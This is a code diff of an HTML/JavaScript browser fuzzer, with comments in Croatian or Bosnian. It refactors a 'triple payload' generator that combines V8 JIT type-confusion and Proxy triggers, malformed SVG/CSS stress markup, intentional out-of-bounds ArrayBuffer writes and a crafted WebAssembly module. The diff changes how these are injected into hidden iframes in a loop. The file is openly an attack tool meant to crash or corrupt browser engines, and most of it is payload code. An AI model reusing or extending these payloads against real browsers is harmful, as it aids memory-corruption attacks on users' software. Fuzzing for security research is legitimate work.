@@ -41,27 +41,16 @@
             log(`Trojni fuzzer spreman. ID: ${testId}`);
         }
 
-        function generateTriplePayload() {
-            // 1. V8 JIT Attack (Type Confusion)
-            let v8Attack = `
-                try {
-                    function target(x) { return x.val || x; }
-                    for (let i = 0; i < 10000; i++) target(1.1); // Warmup za brojeve
-                    for (let j = 0; j < 500; j++) {
-                        target({val: "str"}); // Type Confusion
-                        target(new Proxy({}, {get: function(){ return 1; }})); // Proxy UAF
-                    }
-                } catch(e) {}
-            `;
-
-            // 2. Blink DOM/CSS Attack (Malformed SVG + MathML)
+        function getTriplePayload() {
+            let rand = Math.random();
+            
             let cssAttack = `
                 <style>
                     .jebac { 
-                        transform: rotate(${Math.random() * 360}deg) scale(${Math.random() * 10});
+                        transform: rotate(${rand * 360}deg) scale(${rand * 10});
                         clip-path: polygon(0 0, 100% 0, 50% 100%);
                         mask: url(#m1);
-                        filter: blur(${Math.random() * 10}px);
+                        filter: blur(${rand * 10}px);
                     }
                 </style>
                 <svg>
@@ -71,8 +60,7 @@
                                 <table>
                                     <tr>
                                         <td class="jebac">
-                                            <div style="width:${Math.random()*10000}px; height:${Math.random()*10000}px;">X</div>
-                                            <iframe srcdoc="<script>parent.postMessage('test','*')</script>"></iframe>
+                                            <div style="width:${rand*10000}px; height:${rand*10000}px;">X</div>
                                         </td>
                                     </tr>
                                 </table>
@@ -82,15 +70,20 @@
                 </svg>
             `;
 
-            // 3. WASM / ArrayBuffer Attack (OOB Write)
-            let wasmAttack = `
+            let jsAttack = `
                 try {
-                    let buf = new ArrayBuffer(${Math.floor(Math.random() * 10000)});
-                    let view = new DataView(buf);
-                    // Namjerno pisanje van granica
-                    for(let k=0; k<100; k++) {
-                        view.setUint32(k * 1024, 0x41414141); 
+                    // 1. V8 JIT Type Confusion
+                    function target(x) { return x.val || x; }
+                    for (let i = 0; i < 10000; i++) target(1.1); 
+                    for (let j = 0; j < 500; j++) {
+                        target({val: "str"}); 
+                        target(new Proxy({}, {get: function(){ return 1; }})); 
                     }
+                    
+                    // 2. WASM / ArrayBuffer OOB
+                    let buf = new ArrayBuffer(${Math.floor(rand * 10000)});
+                    let view = new DataView(buf);
+                    for(let k=0; k<100; k++) { view.setUint32(k * 1024, 0x41414141); }
                     
                     if (typeof WebAssembly !== 'undefined') {
                         let bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,10,9,1,7,0,65,0,65,0,54,2,0,11]);
@@ -99,19 +92,7 @@
                 } catch(e) {}
             `;
 
-            // Spajamo sve u jedan HTML dokument
-            return `
-                <!doctype html>
-                <html>
-                <head>${cssAttack}</head>
-                <body>
-                    <script>
-                        ${v8Attack}
-                        ${wasmAttack}
-                    </script>
-                </body>
-                </html>
-            `;
+            return { css: cssAttack, js: jsAttack };
         }
 
         function startFuzz() {
@@ -131,15 +112,22 @@
                     log(`Test ID: ${testId} - Trojni udar...`);
                 }
 
-                let payload = generateTriplePayload();
+                let payload = getTriplePayload();
                 
                 let iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 document.body.appendChild(iframe);
 
                 try {
-                    // Koristimo srcdoc da odmah ubacimo HTML, CSS i JS
-                    iframe.srcdoc = payload;
+                    let doc = iframe.contentWindow.document;
+                    doc.open();
+                    doc.write("<!doctype html><html><head>" + payload.css + "</head><body></body></html>");
+                    doc.close();
+                    
+                    // Sigurno ubacivanje skripte bez </script> problema
+                    let script = doc.createElement('script');
+                    script.textContent = payload.js;
+                    doc.body.appendChild(script);
                 } catch(e) {}
 
                 setTimeout(() => {
@@ -157,4 +145,4 @@
         }
     </script>
 </body>
-                        </html>
+</html>
